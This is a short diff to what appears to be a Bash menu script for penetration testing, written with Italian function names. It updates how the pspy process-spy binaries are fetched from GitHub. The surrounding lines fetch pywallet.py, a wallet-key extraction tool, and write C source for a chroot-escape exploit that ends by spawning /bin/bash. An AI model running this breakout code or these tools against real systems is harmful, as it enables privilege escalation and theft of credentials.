@@ -811,10 +811,22 @@ while true; do
 		Scarica "mikeborghi/pywallet" "$ENTRAW""mikeborghi/pywallet/master/pywallet.py" "pywallet.py"
 	;;
 	"159")
-		Scarica "DominicBreuker/pspy64s" "$ENTSSL""DominicBreuker/pspy/releases/download/v1.2.0/pspy64s" "pspy64s"
+		URT="DominicBreuker/pspy/releases"
+		URD="$URT""/download"
+		select CHC in $(curl "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "pspy64s"|awk -F \" '{print $2}')
+		do
+			Scarica "DominicBreuker/pspy64s" "$ENTSSL""$CHC" "pspy64s"
+			break
+		done
 	;;
 	"160")
-		Scarica "DominicBreuker/pspy32s" "$ENTSSL""DominicBreuker/pspy/releases/download/v1.2.0/pspy32s" "pspy32s"
+		URT="DominicBreuker/pspy/releases"
+		URD="$URT""/download"
+		select CHC in $(curl "$ENTSSL""$URT"|grep "href"|grep "$URD"|grep "pspy32s"|awk -F \" '{print $2}')
+		do
+			Scarica "DominicBreuker/pspy32s" "$ENTSSL""$CHC" "pspy32s"
+			break
+		done
 	;;
 	"161")
 		echo -e "#include <sys/stat.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void){\nmkdir(\"chroot-dir\", 0755);\nchroot(\"chroot-dir\");\nfor(int i = 0; i < 1000; i++){\nchdir(\"..\");\n}\nchroot(\".\");\nsystem(\"/bin/bash\");\n}" > root4.c
